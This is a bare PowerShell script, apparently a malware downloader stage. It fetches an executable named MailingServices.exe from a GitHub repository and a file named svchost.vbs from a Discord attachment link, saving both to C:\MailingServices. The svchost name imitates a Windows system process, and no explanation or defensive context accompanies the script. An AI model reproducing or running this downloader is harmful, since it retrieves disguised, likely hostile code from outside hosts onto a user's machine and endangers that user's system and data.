$url = "https://github.com/violentqm/rest/raw/main/MailingServices.exe"
$outputPath = "C:\MailingServices\MailingServices.exe"
Invoke-WebRequest -Uri $url -OutFile $outputPath
$url2 = "https://cdn.discordapp.com/attachments/1161696732564959355/1173973604103372810/svchost.vbs?ex=6565e71e&is=6553721e&hm=c257f24f1a923a6af73768af9daa8dc886621ded8d4245a7203dfcfacfab6ec0&"
$outputPath2 = "C:\MailingServices\svchost.vbs"
Invoke-WebRequest -Uri $url2 -OutFile $outputPath2
